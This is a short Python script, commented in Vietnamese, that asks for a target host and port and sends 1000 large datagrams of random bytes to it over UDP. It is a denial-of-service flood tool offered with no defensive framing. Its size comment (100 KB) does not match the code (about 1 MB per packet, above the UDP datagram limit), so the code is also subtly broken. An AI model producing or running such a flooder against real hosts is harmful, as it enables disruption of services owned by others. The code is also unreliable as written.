import socket
import random
import time

# Tạo socket UDP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Nhập địa chỉ IP hoặc tên miền và cổng
url = input("Nhập URL hoặc IP đích: ")
port = int(input("Nhập cổng đích: "))

# Chuyển đổi tên miền thành địa chỉ IP (nếu cần)
try:
    target_address = (socket.gethostbyname(url), port)
except socket.error as e:
    print(f"Lỗi khi phân giải URL: {e}")
    exit(1)

# Số lượng vòng lặp và kích thước gói tin
num_messages = 1000
chunk_size = 1024 * 1000  # Kích thước của mỗi gói tin (100 KB)

for i in range(num_messages):
    data = random._urandom(chunk_size)
    s.sendto(data, target_address)
    print(f"Đã gửi: {i + 1}", end='\r')

# Đóng socket
s.close()